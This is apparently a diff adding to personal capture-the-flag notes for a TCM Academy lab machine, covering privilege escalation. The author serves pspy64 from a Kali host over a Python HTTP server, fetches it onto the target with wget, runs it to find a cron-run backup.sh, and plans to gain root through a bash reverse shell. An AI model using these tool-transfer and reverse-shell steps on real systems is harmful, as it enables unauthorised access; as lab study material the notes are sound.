@@ -568,4 +568,75 @@ Download the 64 bit static version
 
 ![[Pasted image 20240706020854.png]]
 
+Copy the pspy to the /transfer. Remember you have listerner `python -m http.server 80`
+
+```
+┌──(root㉿kali)-[~]
+└─# cp Downloads/pspy64 /transfer  
+┌──(root㉿kali)-[~]
+└─# ls /transfer                                  
+linpeas.sh  pspy64
+
+
+```
+
+```
+grimmie@academy:/tmp$ wget http://192.168.64.4/pspy64
+--2024-07-06 02:13:38--  http://192.168.64.4/pspy64
+Connecting to 192.168.64.4:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3104768 (3.0M) [application/octet-stream]
+Saving to: ‘pspy64’
+
+pspy64              100%[================>]   2.96M  --.-KB/s    in 0.04s   
+
+2024-07-06 02:13:39 (83.1 MB/s) - ‘pspy64’ saved [3104768/3104768]
+
+```
+
+We successfully transferred the file
+
+```
+┌──(root㉿kali)-[/transfer]
+└─# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.64.3 - - [05/Jul/2024 22:22:02] "GET /linpeas.sh HTTP/1.1" 200 -
+192.168.64.3 - - [05/Jul/2024 23:13:38] "GET /pspy64 HTTP/1.1" 200 -
+
+
+```
+
+
+Then change the pspy64 permission to execute
+
+```
+grimmie@academy:/tmp$ ls
+backup.zip
+pspy64
+systemd-private-d9c78159cffd499cbaf2fb4263b9ae91-apache2.service-OgQyDD
+systemd-private-d9c78159cffd499cbaf2fb4263b9ae91-systemd-timesyncd.service-GnGCMy
+grimmie@academy:/tmp$ chmod +x pspy64
+
+```
+
+Run the pspy64. We will see all the process running in the machine
+
+```
+./pspy64
+```
+
+![[Pasted image 20240706021726.png]]
+
+
+We can indeed see that the backup is running
+
+![[Pasted image 20240706021821.png]]
+
+
+Now we can use the backup.sh to hack into the root
+To hack the root, search reverse shell bash one line in your browser
+
+Here is the link:
+
+https://academy.tcm-sec.com/courses/1152300/lectures/34117488
 
